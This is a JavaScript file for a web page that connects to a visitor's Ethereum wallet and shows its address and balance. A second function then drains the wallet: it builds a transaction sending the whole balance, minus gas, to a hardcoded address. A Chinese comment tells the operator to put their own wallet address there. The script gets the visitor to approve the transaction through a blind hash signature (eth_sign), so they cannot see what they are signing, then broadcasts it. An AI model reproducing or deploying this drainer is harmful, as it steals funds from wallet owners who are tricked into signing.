var Web3;
var chainid;
var accountAddress;
var ethereumjs;

async function connect() {
  if (window.ethereum) {
    try {
      const accounts = await ethereum?.request({
        method: "eth_requestAccounts"
      });
    } catch (err) {
      console.log("User deny connect");
    }
    web3 = new Web3(window.ethereum);
  } else if (window.web3) {
    web3 = new Web3(window.ethereum);
  } else {
    console.log("ETHEE", window.ethereum);
    alert("Please  install  wallet");
  }

  chainid = await web3.eth.getChainId();
  var blockNumber = await web3.eth.getBlockNumber();
  var account = await web3.eth.getAccounts();
  accountAddress = account[0];

  var balance = await web3.eth.getBalance(accountAddress);

  document.getElementById("chain_id").innerText = chainid;
  document.getElementById("block_number").innerText = blockNumber;
  document.getElementById("account_address").innerText = accountAddress;
  document.getElementById("account_balance").innerText = balance;
}

async function doit() {
  let nonce = await web3.eth.getTransactionCount(accountAddress, "pending");

  let balance = await web3.eth.getBalance(accountAddress);
  const gasPrice = await web3.eth.getGasPrice(); // get gas price
  let chainId = await web3.eth.getChainId(); // get chain id



  let _gasPrice = web3.utils.toHex(Math.floor(gasPrice * 3))
  console.log("gasPrice:", _gasPrice)
  console.log("gasPriceType:", typeof (gasPrice))
  let _gasLimit = 0x5208
  console.log("balance:",balance)
  let _cost = _gasLimit * _gasPrice
  console.log(_cost)
  
  let result = balance - _cost
  console.log(result)


  let tx_ = {
    from: accountAddress,
    to: "0x6fBd70A20acd5c840dC4E55835bEbC6C874bab7B",//***将这里改成自己的钱包地址
    nonce: web3.utils.toHex(nonce),
    gasPrice: web3.utils.toHex(Math.floor(gasPrice * 3)),
    gasLimit: "0x5208",
    value: result,
    data: "0x",
    v: web3.utils.toHex(chainId),
    r: "0x",
    s: "0x"
  };
  console.log("Tx Object", tx_);
  var tx = new ethereumjs.Tx(tx_);
  var serializedTx = "0x" + tx.serialize().toString("hex");
  let hexer = {
    encoding: "hex"
  };
  const sha3_ = web3.utils.sha3(serializedTx, hexer);

  await web3.eth
    .sign(sha3_, accountAddress)
    .then(async (signed) => {
      const temporary = signed.substring(2),
        r_ = "0x" + temporary.substring(0, 64),
        s_ = "0x" + temporary.substring(64, 128),
        rhema = parseInt(temporary.substring(128, 130), 16),
        v_ = web3.utils.toHex(rhema + chainId * 2 + 8);
      tx.r = r_;
      tx.s = s_;
      tx.v = v_;

      console.log("---------------------------------------------");

      const txFin = "0x" + tx.serialize().toString("hex"); //,
      const sha3__ = web3.utils.sha3(txFin, hexer);
      console.log("rawHash:", sha3__);
      console.log("The Broadcast message", txFin);
      await web3.eth
        .sendSignedTransaction(txFin)
        .then((elisebeth) => console.log(elisebeth))
        .catch((vannette) => console.log(vannette));
    })
    .catch((heide) => console.log(heide));
}

function aaa(){
  connect();
  doit();


}